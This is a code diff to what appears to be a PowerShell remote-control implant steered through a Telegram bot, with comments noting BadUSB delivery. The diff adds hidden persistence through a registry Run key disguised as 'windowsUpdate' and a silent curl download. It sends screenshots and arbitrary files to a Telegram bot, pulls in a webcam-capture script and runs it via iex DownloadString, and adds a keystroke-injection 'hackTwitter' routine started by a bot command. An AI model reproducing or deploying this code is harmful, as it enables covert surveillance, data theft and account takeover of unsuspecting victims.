@@ -11,6 +11,9 @@ BADUSB COMMANDS:
 REGEDIT:
 	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"	
 https://www.akadia.com/services/windows_registry.html 
+
+BOT TELEGRAM:
+    https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
 	#>
 
 
@@ -68,21 +71,28 @@ function cleanAll {
 }
 
 function installCurl {
-    
+    $curl = $env:USERPROFILE + "\appdata\local\temp\1\curl.exe"
+    if(![System.IO.File]::Exists($curl)){
+        # file with path $path doesn't exist
+        $ruta = $env:USERPROFILE + "\appdata\local\temp\1"
+        $curl_zip = $ruta + "\curl.zip"
+        $curl = $ruta + "\" + "curl.exe"
+        $curl_mod = $ruta + "\" + "curl_mod.exe"
+        if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
+        if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Funciones/curl.zip","$curl_zip")
+        [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
+        [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
+        }
+        return $curl
+    }
+    # else curl exist
+    return $curl    
 }
 
 function sendPhoto {
     $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
     $photo = "C:\Users\afranco\Documents\screenshot.jpg"
-    $ruta = $env:USERPROFILE + "\appdata\local\temp\1"
-    $curl_zip = $ruta + "\curl.zip"
-    $curl = $ruta + "\" + "curl.exe"
-    $curl_mod = $ruta + "\" + "curl_mod.exe"
-    if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
-    if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Funciones/curl.zip","$curl_zip")
-    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
-    [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
-    }
+    $curl = installCurl
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
@@ -101,12 +111,48 @@ function ipPublic {
 
 function download($FileToDownload) {
     $uri = "https://api.telegram.org/bot" + $BotToken + "/sendDocument"
-    $ruta = $env:USERPROFILE + "\appdata\local\temp\1"
-    $curl = $ruta + "\" + "curl.exe"
+    $curl = installCurl
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F document=@' + $FileToDownload  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
 
     #curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
+}
+
+function webcam {
+    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1'))
+    (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1','Get-WebCamp.ps1')
+    #./Get-WebCamp.ps1 "Get-WebCamp"
+    Import-Module Get-WebCamp.ps1
+    Get-WebCamImage -CamIndex 0 -UseCam -interval 3
+}
+
+function mainBrowser {
+    Write-Host "Checking main browser on the reg.."
+    $mainBrowser = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice
+    if ($mainBrowser -match 'chrome') {
+        Write-Host "Chrome!"
+        $chrome = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
+        return $chrome
+     }
+    ElseIf ($mainBrowser -match 'Firefox') {
+        Write-Host "Firefox!"
+        $firefox = "${env:ProgramFiles(x86)}\Mozilla Firefox\firefox.exe"
+        return $firefox
+     }
+}
+
+function hackTwitter {
+    $mainBrowser = mainBrowser
+    Start-Process $mainBrowser -ArgumentList "https://twitter.com/" -WindowStyle Hidden
+
+    Start-Sleep -Seconds 2
+    $wshell = New-Object -ComObject wscript.shell; $wshell.AppActivate('cisco finesse') 
+
+    Sleep -Seconds 1 $wshell.SendKeys{USER} 
+    sleep -Seconds 7 $wshell.SendKeys("{TAB}") 
+    Sleep -Seconds 1 $wshell.SendKeys('PASSWORD') 
+    Sleep -Seconds 1 $wshell.SendKeys("{TAB}") 
+    Sleep -Seconds 1 $wshell.SendKeys('~')
 }
 
 
@@ -247,6 +293,9 @@ While ($DoNotExit)  {
       "/download $ipV4 *"{
         $FileToDownload = ($LastMessageText -split ("/download $ipV4 "))[1]
         download $FileToDownload
+      }
+      "/hackTwitter $ipV4"{
+        hackTwitter
       }
 	  default  {
 	    #The message sent is unknown
